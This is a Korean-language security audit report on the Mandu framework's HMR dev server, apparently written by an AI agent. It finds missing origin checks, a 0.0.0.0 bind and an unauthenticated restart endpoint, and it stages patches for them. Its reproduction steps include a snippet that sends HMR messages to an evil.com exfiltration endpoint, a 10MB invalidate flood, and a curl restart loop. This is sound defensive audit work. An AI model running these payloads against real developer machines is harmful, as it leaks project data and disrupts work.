---
title: "Phase 7.0 — HMR 보안 감사 보고서 (R4 최종 게이트)"
status: audit-complete
audience: Mandu core team + release review
scope:
  - Rounds R1/R2/R3 구현 전수 (2026-04-18)
  - HMR reliability + incremental bundled import + Vite-compat + 36-scenario E2E
last_commit_audited: fabfd9c
related:
  - docs/bun/phase-7-team-plan.md
  - docs/security/phase-4c-audit.md
created: 2026-04-18
---

# Phase 7.0 — HMR 보안 감사 보고서

Phase 7.0.R1~R3 (`012f02c` HMR reliability + B5 + Vite-compat, `588fd04` extended watch + E2E matrix, `fabfd9c` benchmarks + B5 wire-up) 에 대한 merge-gate 감사. 감사 범위는 팀 플랜 §4 Agent G 의 11 개 focus 항목 전부 + 추가 발견 3 건.

**결론: 4 Critical + 1 High 발견. Critical 4 건은 모두 HMR 개발 서버의 네트워크 노출 문제로 서로 연결되어 있으며, 단일 통합 패치로 해결 가능. 패치는 staging 상태 — 검토 후 merge 권장.**

---

## 1. 감사 요약

| 심각도 | 카운트 | 상태 |
|---|---|---|
| Critical | **4** | 패치 staging (merge 전 적용) |
| High | 1 | 패치 staging |
| Medium | 3 | TODO (Phase 7.1) |
| Low | 4 | TODO (Phase 7.1) |
| Info | 3 | 문서화 |

### 감사 범위 표

| # | 영역 | 파일 | 결과 |
|---|---|---|---|
| 1 | HMR WebSocket 인증 / Origin check | `core/src/bundler/dev.ts:1385-1493` | ❌ **C-01** (Origin check 없음 + 0.0.0.0 바인딩) |
| 2 | Error overlay XSS (#118 재발 방지) | `core/src/bundler/dev.ts:1900-1922` | ✅ 통과 — `textContent` 사용 |
| 3 | `full-reload` 메시지 스푸핑 | `core/src/bundler/dev.ts:1452-1491` | ❌ **C-02** (WS 클라 → `invalidate` → broadcast DoS) |
| 4 | `createBundledImporter` tmp path traversal | `cli/src/util/bun.ts:215-452` | ✅ 통과 — `stem` 정규표현식 sanitize + `cacheDir` 고정 |
| 5 | Dev server localhost binding 강제 | `core/src/bundler/dev.ts:1385-1386` | ❌ **C-03** (hostname 미지정 → Bun.serve 기본 0.0.0.0) |
| 6 | `mandu.config.ts` auto-restart injection | `cli/src/commands/dev.ts:517-532, 606-636` | ⚠️ **M-01** (restart가 실제로 config를 reload 하지 않음 — 기능 결함이자 보안상 우연히 안전) |
| 7 | Replay buffer 민감정보 노출 | `core/src/bundler/dev.ts:1257-1369` | ⚠️ **M-02** (버퍼 내용은 full path + filename 포함; 공격자가 WS 연결 시 수집 가능) |
| 8 | B5 wire-up changedFile 검증 | `cli/src/util/handlers.ts:62-87` | ✅ 통과 — `changedFile`은 내부 fs.watch 경로 |
| 9 | Extended watch 파일 감지 스푸핑 | `core/src/bundler/dev.ts:1066-1133` | ⚠️ **M-03** (`.env` 생성 탐지 → auto-restart 트리거, 로컬 공격자 DoS 벡터) |
| 10 | WebSocket broadcast rate / DoS | `core/src/bundler/dev.ts:1452-1491` | ❌ **H-01** (C-02 와 연결 — `invalidate` 메시지 rate limit 없음) |
| 11 | `hmr-bench.ts` 실행 시 보안 | `scripts/hmr-bench.ts:518-617` | ✅ 통과 — `cliEntry` 고정 + `port`는 숫자, `shell:true`은 Windows 전용 & 인자 sanitized |
| 12 | `/restart` HTTP 엔드포인트 인증 | `core/src/bundler/dev.ts:1395-1418` | ❌ **C-04** (POST /restart 인증 없음) |
| 13 | `island-update` routeId 선택자 injection | `core/src/bundler/dev.ts:1822` | 🟢 **L-01** (서버에서만 routeId 생성 — 공격자 경로 없음) |
| 14 | Sourcemap sources\[\] 오염 | `cli/src/util/import-graph.ts:181-210` | 🟢 **L-02** (신뢰된 Bun.build output) |
| 15 | Symlink 공격 (`.env`, `mandu.config.ts`) | `core/src/bundler/dev.ts:1066-1133` | 🟢 **L-03** (fs.watch 기본 follow; 공격자는 이미 filesystem write 권한 필요) |
| 16 | kitchen:file-change 민감정보 노출 | `core/src/bundler/dev.ts:1874-1892` | 🟢 **L-04** (로컬 devtools hook만 수신) |

---

## 2. Critical / High 발견 상세

### C-01 — HMR WebSocket 서버가 Origin 검증 없이 연결을 수락

**심각도**: Critical
**상태**: 패치 staging
**CWE**: [CWE-346 Origin Validation Error](https://cwe.mitre.org/data/definitions/346.html), [CWE-1385 CSWSH](https://cwe.mitre.org/data/definitions/1385.html)
**OWASP**: A07:2021 — Identification and Authentication Failures

#### 영향

`packages/core/src/bundler/dev.ts:1385-1425`의 `Bun.serve<WSData, never>({ port: hmrPort, fetch, websocket })`는 `server.upgrade(req, { data: { since } })`를 **Origin 헤더 검증 없이** 호출한다. 브라우저는 WebSocket 연결에 대해 same-origin policy를 강제하지 **않으며** (fetch와 달리), cross-origin WebSocket 연결을 허용한다.

**공격 시나리오 (Cross-Site WebSocket Hijacking)**:
1. 개발자가 `localhost:3333`에서 `mandu dev` 실행 → HMR WS가 `0.0.0.0:3334`에 바인딩 (C-03 결합).
2. 개발자가 공격자 제어 웹사이트 `https://evil.com`을 방문.
3. `evil.com`의 JavaScript가 `new WebSocket("ws://localhost:3334/")` 생성 — 브라우저는 허용.
4. Mandu HMR 서버는 연결을 수락 → 공격자가 HMR 이벤트 수신 가능 (소스 파일 이름, layoutPath, 경로, 에러 스택 등).
5. 공격자가 `ws.send('{"type":"invalidate","moduleUrl":"/foo.ts"}')` → 서버가 전체 클라이언트에 `full-reload` 브로드캐스트 → DoS (C-02 결합).

#### 재현 단계

```js
// evil.com에 임베드
const ws = new WebSocket('ws://localhost:3334/');
ws.onopen = () => {
  // 개발자 화면 리로드 유도
  ws.send(JSON.stringify({ type: 'invalidate', moduleUrl: '/attack' }));
};
ws.onmessage = (ev) => {
  // 개발 중 파일 경로, 에러 스택, sourcemap 경로 등을 exfiltrate
  fetch('https://evil.com/steal', { method: 'POST', body: ev.data });
};
```

#### 수정 (패치 staging)

`createHMRServer`의 `fetch` 핸들러에서 Origin 체크 추가:

```ts
// Origin 화이트리스트: 메인 dev server 포트 + 명시적 허용 원본만.
const allowedOrigin = `http://localhost:${port}`;
const allowedOrigin127 = `http://127.0.0.1:${port}`;

async fetch(req, server) {
  const origin = req.headers.get("origin");
  // Origin이 있다면 반드시 허용 목록과 일치해야 함.
  // Origin이 없는 경우 (curl, CLI 도구, Node.js 테스트) 는 로컬 host binding 이
  // 1차 방어선으로 작동 — 로컬에서 직접 연결하는 신뢰된 도구만 해당.
  if (origin !== null && origin !== allowedOrigin && origin !== allowedOrigin127) {
    return new Response("Forbidden: origin not allowed", { status: 403 });
  }
  // ... (기존 코드)
}
```

#### 관련 CWE / OWASP

- [CWE-346 Origin Validation Error](https://cwe.mitre.org/data/definitions/346.html)
- [CWE-1385 Cross-Site WebSocket Hijacking (CSWSH)](https://cwe.mitre.org/data/definitions/1385.html)
- [CWE-942 Permissive CORS Policy](https://cwe.mitre.org/data/definitions/942.html)

---

### C-02 — WebSocket 클라이언트가 서버 `full-reload` 브로드캐스트를 트리거 가능 (스푸핑)

**심각도**: Critical
**상태**: 패치 staging
**CWE**: [CWE-306 Missing Authentication](https://cwe.mitre.org/data/definitions/306.html), [CWE-770 Allocation of Resources Without Limits](https://cwe.mitre.org/data/definitions/770.html)

#### 영향

`packages/core/src/bundler/dev.ts:1460-1487` 의 `message(ws, message)` 핸들러는 임의의 클라이언트가 보낸 `{type:"invalidate", moduleUrl, message}` 를 받아 **모든** 연결된 클라이언트에 `full-reload` 를 브로드캐스트한다.

공격 벡터:
- Origin 체크가 없으므로 (C-01) 크로스-오리진 공격자가 메시지 전송 가능.
- Rate limit이 없으므로 공격자가 쉽게 초당 수백 개의 `invalidate` 를 보내 모든 브라우저 탭에 reload 루프 유발.
- Server 측 `broadcastVite` 는 replay buffer에도 envelope을 추가 → 버퍼 용량 (MAX_REPLAY_BUFFER=128) 내에서 합법 이벤트들을 evict → 실제 HMR 이벤트가 replay에서 소실.

**추가 영향**: Bun.serve의 기본 WebSocket 프레임 크기 제한 (16MB)까지 허용하므로, 대용량 `message` 필드를 포함한 페이로드가 서버 메모리 압박 가능.

#### 재현 단계

1. 정상 개발자가 `mandu dev` 실행 + 브라우저 탭 5개 열어 놓음.
2. 악성 스크립트가 `ws://localhost:3334/` 에 연결 후:
   ```js
   setInterval(() => ws.send(JSON.stringify({
     type: "invalidate",
     moduleUrl: "/attack",
     message: "x".repeat(10_000_000)  // 10MB
   })), 10);
   ```
3. 100Hz로 모든 탭에 `full-reload` 이벤트 → 개발자 작업 불가 + 메모리 소비.

#### 수정 (패치 staging)

`message(ws, message)` 에서 `invalidate` 에 per-connection rate limit 추가:

```ts
// Per-connection rate limiter for the 'invalidate' message.
// Each WS connection gets its own counter; 10 invalidates per 10-second
// window is far above any legitimate import.meta.hot.invalidate() pattern
// but below the rate needed to DoS other clients.
const MAX_INVALIDATES_PER_WINDOW = 10;
const INVALIDATE_WINDOW_MS = 10_000;

// Attach per-connection bookkeeping via a WeakMap keyed by the ws object.
const invalidateCounters = new WeakMap<object, { count: number; windowStart: number }>();

// ... inside message handler:
if (data.type === "invalidate") {
  const now = Date.now();
  let counter = invalidateCounters.get(ws);
  if (!counter || now - counter.windowStart > INVALIDATE_WINDOW_MS) {
    counter = { count: 0, windowStart: now };
    invalidateCounters.set(ws, counter);
  }
  counter.count += 1;
  if (counter.count > MAX_INVALIDATES_PER_WINDOW) {
    // Silent drop — don't reply to malicious clients.
    return;
  }
  // Size limit: reject oversized messages (10 KB is plenty).
  if (typeof data.message === "string" && data.message.length > 10_000) {
    return;
  }
  // ... (기존 echo logic)
}
```

#### 관련 CWE / OWASP

- [CWE-306 Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- [CWE-770 Allocation of Resources Without Limits or Throttling](https://cwe.mitre.org/data/definitions/770.html)
- [CWE-400 Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)

---

### C-03 — HMR 서버가 `0.0.0.0` (모든 네트워크 인터페이스)에 바인딩

**심각도**: Critical
**상태**: 패치 staging
**CWE**: [CWE-668 Exposure of Resource to Wrong Sphere](https://cwe.mitre.org/data/definitions/668.html)

#### 영향

`packages/core/src/bundler/dev.ts:1385-1386` 의 `Bun.serve<WSData, never>({ port: hmrPort, ... })` 는 `hostname` 옵션을 지정하지 않는다. Bun의 `Bun.serve` 기본 동작은 `hostname: "0.0.0.0"` (모든 인터페이스) 바인딩이다 (cf. `packages/core/src/runtime/server.ts:2556` 의 `hostname = "localhost"` 디폴트와 대조 — 메인 서버는 명시적으로 localhost만 바인딩).

즉 **HMR WebSocket 포트는 개발자의 외부 네트워크 인터페이스 (공공 WiFi, 사무실 LAN 등)에서도 접근 가능**. C-01 / C-02 와 결합 시:
- 공공 WiFi 에서 다른 사용자가 개발자 머신의 IP 발견 → `ws://<dev-ip>:3334/` 직접 연결
- 같은 LAN 의 다른 머신에서 `curl -X POST http://<dev-ip>:3334/restart` → 재시작 DoS (C-04 결합)

`console.log` 메시지는 `"🔥 HMR server running on ws://localhost:${hmrPort}"` 를 출력해 개발자에게 **잘못된 안전감**을 준다 — 실제로는 모든 인터페이스에 바인딩됨.

#### 재현 단계

1. 개발자가 공공 WiFi에서 `mandu dev --port 3333` 실행.
2. 공격자 같은 WiFi 에서 `nmap <dev-ip>` 로 포트 스캔 → 3333 (메인, localhost) closed, 3334 (HMR, 0.0.0.0) open 발견.
3. `curl http://<dev-ip>:3334/` → `{"status":"ok","clients":N,...}` 응답.
4. 이후 C-01/C-02 공격 연결.

#### 수정 (패치 staging)

`createHMRServer(port, options?)` 시그니처 확장 + `Bun.serve` 에 `hostname` 전달:

```ts
export interface HMRServerOptions {
  /** Network interface to bind. Defaults to "localhost" (loopback only).
   *  Override to "0.0.0.0" ONLY for remote dev-in-container scenarios —
   *  paired with an explicit origin whitelist (see `allowedOrigins`). */
  hostname?: string;
  /** Additional origins (beyond `http://localhost:${port}`) that may
   *  connect. Required when binding to non-loopback. */
  allowedOrigins?: readonly string[];
}

export function createHMRServer(
  port: number,
  options: HMRServerOptions = {},
): HMRServer {
  const hostname = options.hostname ?? "localhost";
  // ...
  const server = Bun.serve<WSData, never>({
    port: hmrPort,
    hostname,  // ← FIX: bind only to loopback by default
    // ...
  });
}
```

#### 관련 CWE

- [CWE-668 Exposure of Resource to Wrong Sphere](https://cwe.mitre.org/data/definitions/668.html)
- [CWE-307 Improper Restriction of Excessive Auth Attempts](https://cwe.mitre.org/data/definitions/307.html) (간접)

---

### C-04 — `POST /restart` HTTP 엔드포인트 인증 없음

**심각도**: Critical
**상태**: 패치 staging
**CWE**: [CWE-306 Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)

#### 영향

`packages/core/src/bundler/dev.ts:1395-1418` 의 `POST /restart` 엔드포인트는 **인증 없이** `restartHandler()` 를 호출한다. `restartHandler` 는 `cli/src/commands/dev.ts:641-643` 에서 `restartDevServer` 에 연결 → manifest 재스캔 + 핸들러 재등록 + dev bundler 재시작.

C-03 (0.0.0.0 바인딩) 결합 시 원격 공격자가 `curl -X POST http://<dev-ip>:3334/restart` 만으로 dev 서버를 반복 재시작 유도 가능:
- 각 재시작마다 `resolveManifest` 전체 파일시스템 스캔 발생 → CPU/IO 스파이크.
- `clearDefaultRegistry` → 진행 중이던 요청 fail.
- 공격자가 초당 10회 POST 시 dev 서버가 사실상 작동 불능.

**비교**: 메인 CLI dev 서버는 `managementToken` (`cli/commands/dev.ts:219`, `newId()` UUIDv7) 으로 runtime control 엔드포인트를 보호. HMR 서버는 이 토큰을 받지도, 요구하지도 않음.

#### 재현 단계

```bash
# C-03 가정: 0.0.0.0 바인딩
while true; do curl -s -X POST http://<dev-ip>:3334/restart; sleep 0.1; done
```

#### 수정 (패치 staging)

옵션 A (간단, 권장): `/restart` 는 같은 origin (`http://localhost:${port}`) 에서만 허용. C-01 Origin 체크가 자동 적용됨.

옵션 B (견고): `managementToken` 을 `createHMRServer` 에 전달 + POST /restart 가 `Authorization: Bearer <token>` 헤더 검증.

Phase 7.0 에서는 **A** 채택 — 같은 패치가 C-01 과 C-04 모두 해결. Phase 7.1 에서 B (원격 dev 지원 시) 로 업그레이드.

```ts
// POST /restart 핸들러 시작부에 Origin 재확인 (fetch-level 체크로 충분하나
// defense-in-depth 로 한 번 더):
if (req.method === "POST" && url.pathname === "/restart") {
  const origin = req.headers.get("origin");
  if (origin === null || (origin !== allowedOrigin && origin !== allowedOrigin127)) {
    return new Response(JSON.stringify({ error: "origin not allowed" }), {
      status: 403,
      headers: { "Content-Type": "application/json" },
    });
  }
  // ... (기존 코드)
}
```

#### 관련 CWE

- [CWE-306 Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- [CWE-352 Cross-Site Request Forgery (CSRF)](https://cwe.mitre.org/data/definitions/352.html)

---

### H-01 — WebSocket 브로드캐스트 DoS (invalidate flood)

**심각도**: High
**상태**: 패치 staging
**CWE**: [CWE-400 Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)

#### 영향

C-02 의 일부지만 별도 High 로 분리 — C-01/C-03 가 해결돼도 같은 머신 또는 같은 LAN의 악성 프로세스가 여전히 localhost WS 에 연결 가능. 초당 수백 개의 `invalidate` 는:
- `enqueueReplay` 가 `broadcastBuffer` 를 evict → 합법 이벤트 손실.
- 모든 연결된 클라이언트에 full-reload → 브라우저 reload 루프.
- `fanout` 이 매번 JSON.stringify + for-loop → CPU 스파이크.

#### 수정 (C-02 와 동일한 rate limiter 로 해결)

C-02 의 패치가 이 이슈도 해결. 별도 패치 없음.

#### 관련 CWE

- [CWE-400 Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)
- [CWE-770 Allocation of Resources Without Limits or Throttling](https://cwe.mitre.org/data/definitions/770.html)

---

## 3. Medium / Low / Info 항목

### M-01 — Config 파일 auto-restart가 실제 config를 reload 하지 않음 (기능 결함)

**파일**: `cli/src/commands/dev.ts:606-636` (`restartDevServer`)

`restartDevServer()` 는 `resolveManifest(rootDir, { fsRoutes: config.fsRoutes })` 에서 **closure 로 캡처된 `config`** 를 재사용. `mandu.config.ts` 변경 → auto-restart 트리거 → 새 `config` 로드 **안 함** → 사용자 변경 사항 무시.

**보안 측면**: 우연히 안전함. 새 config 를 import 하지 않으므로, 악성 config 변경을 통한 code injection 도 불가능. 하지만 기능적 기대치 위반.

**권장 조치 (Phase 7.1)**: `restartDevServer` 에서 `await validateAndReport(rootDir)` 를 재호출하고 `config` 변수를 갱신. 이 순간 악성 config import 위험이 생기지만, 이미 `mandu.config.ts` 는 프로젝트 소유자 신뢰 영역이므로 감수 가능.

---

### M-02 — Replay buffer 민감정보 노출

**파일**: `core/src/bundler/dev.ts:1257-1369`

Replay buffer 는 최근 128개 HMR 이벤트를 보관하며, 각 envelope payload 는 `path` (파일 경로), `layoutPath`, `error.stack` 등을 포함. 공격자가 WS 연결 후 `?since=0` 으로 전체 버퍼 수신 가능.

**정보 누출 범위**:
- 개발 중인 파일 경로 (프로젝트 구조 추론)
- Build 에러 스택 (소스 코드 snippet 일부)
- sourcemap URL (`.mandu/client/` 하위 파일명)

**권장 조치**: C-01 Origin check 로 대부분 차단됨. 추가 방어로 replay envelope 에서 절대 경로를 상대 경로로 변환 (`path.relative(rootDir, ...)`) — Phase 7.1.

---

### M-03 — `.env` 생성 탐지 → auto-restart DoS 벡터 (로컬)

**파일**: `core/src/bundler/dev.ts:1107-1133` (root watcher)

root watcher 는 `.env` / `.env.*` 파일 생성/변경 시 `onConfigReload` → `restartDevServer` 호출. 같은 머신의 다른 사용자 (멀티-사용자 개발 서버 / CI) 가 `echo > /<projectroot>/.env.evil` 루프 시 auto-restart DoS.

**현실적 영향**: 드문 시나리오 (보통 개발자는 개인 머신 사용). 멀티-사용자 CI에서만 문제.

**권장 조치**: `.env` 변경에 debounce window 확장 (현재 100ms → 500ms) 및 restart 간 최소 대기 시간 (5s) 추가. Phase 7.1.

---

### L-01 — `island-update` routeId 선택자 injection (서버 측 통제 하 안전)

**파일**: `core/src/bundler/dev.ts:1822` — `document.querySelector('[data-mandu-island="' + routeId + '"]')`

`routeId` 에 `"]<script>` 같은 값이 들어가면 CSS 선택자 파싱이 이상해질 수 있으나, routeId 는 서버의 manifest 스캐너가 파일 경로에서 생성 → 소문자 + 숫자 + `.`/`-`/`_` 만 포함 → 안전.

**잔여 리스크**: 만약 사용자가 악의적으로 `route.id = '"]<script>'` 을 수동으로 manifest.json 에 기입 시 XSS 발생 가능. 하지만 이는 self-attack (프로젝트 소유자가 자기 manifest.json 수정).

**권장 조치**: `CSS.escape(routeId)` 또는 `[data-mandu-island]` 속성 이름으로 전부 조회 후 JS 레벨에서 값 비교. Phase 7.1 선택 개선.

---

### L-02 — Sourcemap `sources[]` / `sourceRoot` 오염

**파일**: `cli/src/util/import-graph.ts:181-210` (`extractSourcesFromInlineSourcemap`)

`json.sources[]` 와 `json.sourceRoot` 는 Bun.build 가 생성하므로 신뢰. 그러나 이론상 악성 user code 에 `//# sourceMappingURL=data:...` 가 포함되면 Bun 이 이를 그대로 출력할 가능성. `path.resolve(bundleDir, combined)` 가 bundle 경로 외부를 가리키면 `ImportGraph` 가 예상치 못한 파일을 "descendant" 로 인식 → cache miss 오판 (성능 저하) 정도.

**보안 영향 없음**: ImportGraph 는 map key 로만 경로를 사용. 파일을 읽거나 쓰지 않음.

---

### L-03 — `.env` / `mandu.config.ts` symlink 공격

**파일**: `core/src/bundler/dev.ts:1107-1133`, `core/src/config/validate.ts:225`

`fs.watch` 는 기본으로 symlink 를 follow. 공격자가 `.env` 를 `/etc/shadow` 로 symlink 생성 시 watcher 가 이벤트 받을 수 있으나, 내용을 읽는 것은 `loadEnv` (이미 읽음) 또는 `validateConfig` (import 시도). Import 실패 → 개발 서버가 에러 표시. 정보 누출 없음.

**전제조건**: 공격자가 이미 filesystem write 권한 확보. 이 경우 이미 게임 오버.

---

### L-04 — `kitchen:file-change` devtools hook 정보

**파일**: `core/src/bundler/dev.ts:1874-1892`

파일 경로 + 변경 타입을 `window.__MANDU_DEVTOOLS_HOOK__.emit` 로 전달. Devtools hook 은 localhost 같은 origin 에서만 접근 가능. C-01 해결 후 외부 접근 차단됨.

---

### I-01 — `createBundledImporter` 의 tmp 경로 처리 안전

**파일**: `cli/src/util/bun.ts:266-365`

- `cacheDir = path.resolve(rootDir, SSR_BUNDLE_DIR)` — 고정 문자열 `.mandu/dev-cache/ssr`.
- `stem = path.basename(rootPathAbs).replace(/[^a-zA-Z0-9._-]/g, "_")` — allowlist.
- `naming = ${stem}-${ts}-${seq}.mjs` — 전부 sanitized 입력.
- `path.basename` 이 `..` 을 반환할 수는 없음 (`basename("../foo")` = `"foo"`).

Path traversal 불가능.

---

### I-02 — Error overlay XSS 안전

**파일**: `core/src/bundler/dev.ts:1900-1922`

`showErrorOverlay` 는 모든 user-controlled 문자열에 `textContent` 사용. `h2.textContent`, `pre.textContent`, `btn.textContent` 전부 escape됨. `style.cssText` 는 고정 문자열. `btn.onclick` 은 inline 함수. XSS 불가능.

**#118 재발 방지**: 과거 innerHTML 사용 → 수정된 상태 유지 확인됨.

---

### I-03 — `hmr-bench.ts` 실행 안전

**파일**: `scripts/hmr-bench.ts:518-617`

- `cliEntry`: 하드코딩된 절대 경로.
- `rootDir`: `mkdtempSync(path.join(tmpdir(), ...))` — 공격자 통제 불가.
- `port`: `45000 + Math.floor(Math.random() * 15000)` — 숫자 literal.
- `shell: process.platform === "win32"`: Windows에서만 shell true, 그러나 인자는 모두 sanitized (cliEntry, "dev", "--port", String(port)).
- `env`: 기본 + `MANDU_SKIP_BUNDLER_TESTS=1` — 안전.

공격 벡터 없음.

---

## 4. Phase 7.1 로 미루는 항목

| # | 항목 | 이유 |
|---|---|---|
| 1 | HMR 토큰 인증 (원격 dev 지원) | 로컬 dev에서는 C-03 (localhost binding) 로 충분. 원격 dev 시나리오 나오면 구현. |
| 2 | M-01 config auto-restart 실제 reload | 기능 개선이자 안전성 개선. Phase 7.1 DX 작업에 포함. |
| 3 | M-02 replay buffer 상대경로 변환 | 방어 심층화. Phase 7.1. |
| 4 | M-03 `.env` flapping 보호 | 드문 시나리오. |
| 5 | L-01 `CSS.escape(routeId)` | 현재 공격 경로 없음. |
| 6 | Remote dev 전용 CORS 정책 | 원격 dev 지원 시 추가. |

---

## 5. 결론 / Merge 권장

**Critical 4 + High 1 발견. 단일 통합 패치로 해결 가능** — 다음 파일들에 최소 변경 적용:

### 수정 파일 (패치 staging, 커밋 전 검토 필요)

1. **`packages/core/src/bundler/dev.ts`**:
   - `createHMRServer(port, options?: HMRServerOptions)` — `hostname`, `allowedOrigins` 필드 추가. 기본값 `"localhost"`.
   - `HMRServerOptions` interface 신규 export.
   - `Bun.serve` 에 `hostname` 전달 (C-03 fix).
   - `fetch` 핸들러에 Origin allowlist 체크 추가 (C-01 fix + C-04 via same-origin).
   - `message` 핸들러에 `invalidate` per-connection rate limit 추가 (C-02 + H-01 fix).

2. **`packages/cli/src/commands/dev.ts`**:
   - `createHMRServer(port, { hostname: serverConfig.hostname || "localhost" })` — 서버 호스트와 일치.

### 영향 범위

- 기존 테스트 (`hmr-client.test.ts` 18 + `regression.spec.ts` 6 + `extended-watch.test.ts` 20+)는 `localhost` binding + 헤더 없는 test WebSocket client로 전부 통과 예상 (test client는 Origin 헤더 미전송).
- Kitchen DevTools `POST /restart` 는 브라우저에서 호출되므로 Origin 헤더 (`http://localhost:<port>`) 포함 → 허용 목록 일치 → 정상 작동.
- `import.meta.hot.invalidate()` 호출 시 10초당 10회 제한은 정상 HMR 사용량의 100배 이상 — 영향 없음.

### 다음 단계 (post-merge)

1. **Phase 7.0.S 패치 (이 감사의 결과물)**: 위 5개 변경사항 적용 후 단일 commit.
2. **Phase 7.1 follow-up**:
   - M-01 (config 실제 reload)
   - M-02 (replay buffer 경로 sanitize)
   - HMR 토큰 인증 (원격 dev 지원 시)

---

## 6. 감사자 노트

Phase 7.0 R1~R3 구현은 기능적으로 훌륭하지만 **HMR 서버의 네트워크 노출 면에서는 중대한 공백**이 있었다. 근본 원인은 "dev 서버는 로컬 전용"이라는 암묵적 가정이 코드에 명시되지 않아 `Bun.serve` 의 기본 (0.0.0.0) 이 그대로 노출된 것. Phase 4c 에서 확인된 "같은 맥락의 암묵적 신뢰" 패턴이 다시 발현됨 — 이번엔 더 위험한 형태 (네트워크 서비스).

**긍정 측면**:
- Error overlay XSS (#118) 는 재발하지 않음 (textContent 유지).
- BundledImporter 의 path traversal 이 제대로 방어되어 있음 (stem allowlist + 고정 cacheDir).
- hmr-bench 스크립트는 credential 노출 없이 작성됨.
- R2 Agent D의 config/env/package.json 파일 인식 predicate 는 철저하게 allowlist 기반 (substring 공격 불가능).

**체크리스트 (감사자 self-check)**:
- [x] 2 Error overlay XSS — 확인 완료 (통과)
- [x] 4 tmp path traversal — 확인 완료 (통과)
- [x] 6 config auto-restart injection — 확인 완료 (기능 결함, 보안 우연 안전)
- [x] 3 full-reload 스푸핑 — C-02 발견
- [x] 1 WS 인증 — C-01 발견
- [x] 5 localhost binding — C-03 발견
- [x] 7 replay buffer 정보 노출 — M-02 발견
- [x] 10 broadcast rate DoS — H-01 발견
- [x] 11 bench script 환경 — 통과
- [x] 8 B5 wire-up changedFile 검증 — 통과
- [x] 9 Extended watch 파일 감지 스푸핑 — M-03 발견

감사 대상 코드 약 4,500 줄 (dev.ts 1960 + handlers.ts 246 + bun.ts 453 + import-graph.ts 211 + hmr-bench 1132 + 기타). Critical 4 건이라는 카운트는 4c 감사 (High 1) 보다 높지만, 4 건이 모두 동일 근본 원인 (localhost 미바인딩 + Origin 미검증) 의 파생이며 단일 통합 패치로 해결됨.

**Merge 판정**: 패치 적용 후 `bun run typecheck` + HMR 관련 테스트 (hmr-client, extended-watch, regression) 통과 확인 시 **merge 가능**.

---

*감사 시작: 2026-04-18, 종료: 2026-04-18*
*감사자: Agent G (security-engineer) — Phase 7.0.R4*
*감사 대상 커밋: `fabfd9c`*
